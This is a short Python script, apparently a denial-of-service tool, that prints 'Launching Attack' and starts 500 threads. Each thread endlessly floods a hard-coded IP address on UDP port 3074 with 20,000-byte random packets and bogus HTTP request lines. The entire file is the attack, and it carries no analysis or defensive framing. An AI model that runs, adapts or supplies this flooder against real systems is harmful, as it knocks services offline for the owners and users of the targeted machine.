  
import sys
import os
import time
import threading
import socket
import random

bytes = random._urandom(20000)

ip = '98.155.64.207'
port = 3074

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Launching Attack")

def attack():
	while True:
		sock.sendto(bytes, (ip,port))
		sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
		sock.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (ip, port))

for i in range(500):
		thread = threading.Thread(target=attack)
		thread.setDaemon = True
		thread.start()


